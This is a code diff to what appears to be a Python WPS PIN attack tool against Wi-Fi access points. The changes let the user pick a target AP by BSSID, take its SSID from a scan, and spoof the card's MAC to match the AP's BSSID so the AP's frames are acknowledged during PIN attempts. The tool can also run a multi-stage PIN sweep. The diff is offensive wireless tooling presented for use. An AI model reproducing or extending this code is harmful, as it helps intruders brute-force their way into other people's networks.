@@ -189,7 +189,7 @@ async def run_one_attempt(iface, bssid: str, ssid: str, channel: int, our_mac: b
 
 
 async def main_async(args) -> int:
-    defaults = load_default_target()
+    defaults = {} if args.bssid else load_default_target()
     bssid = args.bssid or defaults.get("bssid")
     ssid = args.ssid if args.ssid is not None else defaults.get("ssid", "")
     channel = args.channel or int(defaults.get("channel", "1"))
@@ -201,10 +201,12 @@ async def main_async(args) -> int:
 
     ifaces, iface, array = await discover_iface(args.debug)
     capture: list = []
-    iface.register_rx_callback(lambda pkt: capture.append((time.monotonic(), pkt.raw)))
+    iface.register_rx_callback(lambda pkt: capture.append((time.time(), pkt.raw)))
     our_mac = bytes([0x02, 0xAA, 0xBB]) + struct.pack(">I", int(time.time()))[1:]
     try:
         found_ap = await find_ap(iface, array, channel, bssid, ssid, args.scan_secs)
+        if found_ap and not ssid:
+            ssid = found_ap.ssid or ""
 
         if args.campaign:
             from types import SimpleNamespace
@@ -232,6 +234,14 @@ async def main_async(args) -> int:
             write_pcap(Path(args.out), capture)
             return 0
 
+        fake_mac = await iface.set_fake_mac(None, str_to_mac(bssid))
+        if fake_mac:
+            our_mac = str_to_mac(fake_mac)
+            info(f"Active monitor: card HW-ACKs {fake_mac}")
+        else:
+            info(f"[warn] {iface.name} can't active-monitor; the AP's frames to "
+                 f"{mac_str(our_mac)} go unACKed and it will retransmit them.")
+
         if args.pin:
             attempts = [(args.pin, "as given")]
         else:
@@ -255,6 +265,7 @@ async def main_async(args) -> int:
         return 0
     finally:
         step("Release device")
+        await iface.clear_fake_mac()
         await wlan_close(ifaces)
         info("Closed.")
 
@@ -262,8 +273,8 @@ async def main_async(args) -> int:
 def main() -> int:
     p = argparse.ArgumentParser(description=__doc__.splitlines()[0])
     p.add_argument("--bssid", help="target AP BSSID (default: driver_sources/wps_pin.txt)")
-    p.add_argument("--ssid", help="target AP SSID (default: from wps_pin.txt)")
-    p.add_argument("--channel", type=int, help="target channel (default: from wps_pin.txt)")
+    p.add_argument("--ssid", help="target AP SSID (default: from the scan with --bssid, else wps_pin.txt)")
+    p.add_argument("--channel", type=int, help="target channel (default: 1 with --bssid, else wps_pin.txt)")
     p.add_argument("--pin", help="try a single specific 8-digit PIN instead of the wrong+correct pair")
     p.add_argument("--campaign", action="store_true",
                    help="run the full WpsCampaign sweep (COMMON->first-half->second-half) instead of the probe pair")
